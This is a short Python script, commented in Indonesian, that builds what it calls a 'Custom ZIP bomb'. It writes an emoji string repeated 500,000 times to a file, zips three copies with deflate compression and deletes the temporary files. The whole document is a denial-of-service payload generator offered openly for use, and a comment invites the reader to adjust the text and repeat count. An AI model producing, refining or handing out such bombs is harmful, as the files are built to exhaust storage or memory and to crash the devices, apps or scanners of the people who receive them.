import zipfile
import os

# Custom content for the file
custom_text = ("㊗㊗.2⃣9⃣.㊗㊗㊗㊗.2⃣9⃣.㊗㊗㊗㊗.2⃣9⃣..\n" * 500000)  # kamu bisa modifikasi isi teks di filter,txt (jumlah yang akan di ulanag: 500000/500rb)

# Setup temporary directory
os.makedirs("bomb_files", exist_ok=True)
with open("bomb_files/filler.txt", "w") as f:
    f.write(custom_text)

# Create ZIP file with repeated entries
with zipfile.ZipFile("zipper.zip", "w", compression=zipfile.ZIP_DEFLATED) as zipf:
    for i in range(3):  # Repeat the same file to simulate a bomb
        zipf.write("bomb_files/filler.txt", arcname=f"file_{i}.txt")

os.remove("bomb_files/filler.txt")
os.rmdir("bomb_files")

print("Custom ZIP bomb created as 'zipper.zip'")